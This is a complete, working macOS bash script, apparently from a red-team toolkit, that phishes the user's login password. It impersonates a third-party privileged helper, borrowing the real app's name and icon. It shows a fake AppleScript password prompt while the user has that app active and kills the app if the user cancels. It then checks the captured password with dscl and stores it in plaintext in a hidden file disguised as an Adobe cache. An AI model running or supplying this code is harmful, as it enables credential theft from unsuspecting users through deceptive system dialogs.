#!/bin/bash
# Privileged Helper Tool Spoofing — SentinelOne Technique
# Enumerates installed privileged helper tools, extracts parent app info,
# grabs real app icon, waits for app to be active, then shows contextual prompt.
#
# MITRE: T1056.002 (GUI Input Capture), T1059.002 (AppleScript)
# Ref: https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/

USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"

# ============================================================
# Phase 1: Enumerate Privileged Helper Tools
# ============================================================

enumerate_helpers() {
    local helpers=()
    for helper in /Library/PrivilegedHelperTools/*; do
        [ -f "$helper" ] || continue
        local name=$(basename "$helper")
        # Skip Apple's own helpers
        echo "$name" | grep -q "^com.apple" && continue
        helpers+=("$helper")
    done
    printf '%s\n' "${helpers[@]}"
}

# ============================================================
# Phase 2: Extract Parent Application from Helper
# ============================================================

get_parent_app() {
    local helper="$1"
    local bundle_id=""
    
    # Try to read the embedded plist from the helper binary
    # AuthorizedClients contains the signing identity of the parent app
    local auth_clients=$(strings "$helper" 2>/dev/null | grep -A1 "AuthorizedClients" | grep "identifier" | head -1)
    
    if [ -n "$auth_clients" ]; then
        # Extract bundle identifier from signing requirement
        bundle_id=$(echo "$auth_clients" | sed 's/.*identifier "\([^"]*\)".*/\1/')
    fi
    
    # If we got a bundle ID, find the app
    if [ -n "$bundle_id" ]; then
        # Search common app locations
        for search_dir in "/Applications" "$HOME/Applications" "/Library"; do
            local found=$(find "$search_dir" -name "Info.plist" -maxdepth 4 2>/dev/null | while read plist; do
                local bid=$(/usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$plist" 2>/dev/null)
                if [ "$bid" = "$bundle_id" ]; then
                    dirname "$(dirname "$plist")"
                    break
                fi
            done)
            if [ -n "$found" ]; then
                echo "$found"
                return 0
            fi
        done
    fi
    
    # Fallback: try matching by helper name prefix to app name
    local helper_name=$(basename "$helper")
    local prefix=$(echo "$helper_name" | sed 's/\.[^.]*$//' | tr '.' '/')
    
    return 1
}

# ============================================================
# Phase 3: Extract App Info (name, icon)
# ============================================================

get_app_info() {
    local app_path="$1"
    local info_plist="$app_path/Contents/Info.plist"
    
    if [ ! -f "$info_plist" ]; then
        return 1
    fi
    
    local app_name=$(/usr/libexec/PlistBuddy -c "Print CFBundleName" "$info_plist" 2>/dev/null)
    local icon_file=$(/usr/libexec/PlistBuddy -c "Print CFBundleIconFile" "$info_plist" 2>/dev/null)
    
    # Ensure icon has .icns extension
    echo "$icon_file" | grep -q "\.icns$" || icon_file="${icon_file}.icns"
    
    local icon_path="$app_path/Contents/Resources/$icon_file"
    
    echo "$app_name|$icon_path|$app_path"
}

# ============================================================
# Phase 4: Wait for App to be Active
# ============================================================

wait_for_app() {
    local app_path="$1"
    local timeout=300  # 5 min max wait
    local elapsed=0
    
    local bundle_id=$(/usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$app_path/Contents/Info.plist" 2>/dev/null)
    
    while [ $elapsed -lt $timeout ]; do
        # Check if app is frontmost
        local front=$(/usr/bin/osascript -e 'tell application "System Events" to get bundle identifier of first process whose frontmost is true' 2>/dev/null)
        if [ "$front" = "$bundle_id" ]; then
            return 0
        fi
        sleep 5
        elapsed=$((elapsed + 5))
    done
    
    return 1
}

# ============================================================
# Phase 5: Show Contextual Credential Prompt
# ============================================================

show_prompt() {
    local app_name="$1"
    local icon_path="$2"
    local helper_name="$3"
    
    local icon_arg=""
    if [ -f "$icon_path" ]; then
        # Convert POSIX path to HFS path for osascript
        local hfs_path=$(echo "$icon_path" | sed 's|/|:|g' | sed 's|^:|Macintosh HD:|')
        icon_arg="with icon file \"$hfs_path\""
    else
        icon_arg="with icon caution"
    fi
    
    local pw
    pw=$(/usr/bin/osascript << EOF
tell application "System Events"
    activate
    set userPassword to text returned of (display dialog ¬
        "$app_name Helper needs your password to perform a privileged operation." & return & return & ¬
        "Process: $helper_name" ¬
        default answer "" ¬
        with hidden answer ¬
        buttons {"Cancel", "OK"} ¬
        default button "OK" ¬
        $icon_arg ¬
        with title "$app_name")
    return userPassword
end tell
EOF
    )
    echo "$pw"
}

# ============================================================
# Phase 6: Kill App on Cancel (SentinelOne Technique)
# ============================================================

kill_app_on_cancel() {
    local app_path="$1"
    local app_name=$(basename "$app_path" .app)
    killall "$app_name" 2>/dev/null
}

# ============================================================
# Main
# ============================================================

main() {
    # Find a good helper to spoof
    local helpers=$(enumerate_helpers)
    
    if [ -z "$helpers" ]; then
        # No third-party helpers found — fall back to Finder dialog
        exec "$(dirname "$0")/../finder-dialog/finder_dialog_capture.sh"
    fi
    
    # Try each helper until we find one with a resolvable parent app
    while IFS= read -r helper; do
        local app_path=$(get_parent_app "$helper")
        [ -z "$app_path" ] && continue
        
        local info=$(get_app_info "$app_path")
        [ -z "$info" ] && continue
        
        local app_name=$(echo "$info" | cut -d'|' -f1)
        local icon_path=$(echo "$info" | cut -d'|' -f2)
        local helper_name=$(basename "$helper")
        
        echo "[*] Targeting: $app_name (helper: $helper_name)"
        
        # Wait for user to actively use the app
        echo "[*] Waiting for $app_name to be active..."
        if wait_for_app "$app_path"; then
            # Small delay to feel natural
            sleep 2
            
            # Show the prompt
            PW=$(show_prompt "$app_name" "$icon_path" "$helper_name")
            
            if [ -z "$PW" ]; then
                # User cancelled — kill the app (they'll relaunch)
                kill_app_on_cancel "$app_path"
                sleep 5
                
                # Try once more after relaunch
                if wait_for_app "$app_path"; then
                    sleep 2
                    PW=$(show_prompt "$app_name" "$icon_path" "$helper_name")
                fi
            fi
            
            if [ -n "$PW" ]; then
                # Validate with dscl
                if dscl . -authonly "$USER" "$PW" 2>/dev/null; then
                    mkdir -p "$(dirname "$OUTFILE")"
                    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)|$USER|$PW|helper_spoof:$helper_name" >> "$OUTFILE"
                    chmod 600 "$OUTFILE"
                    exit 0
                fi
            fi
        fi
    done <<< "$helpers"
    
    exit 1
}

main
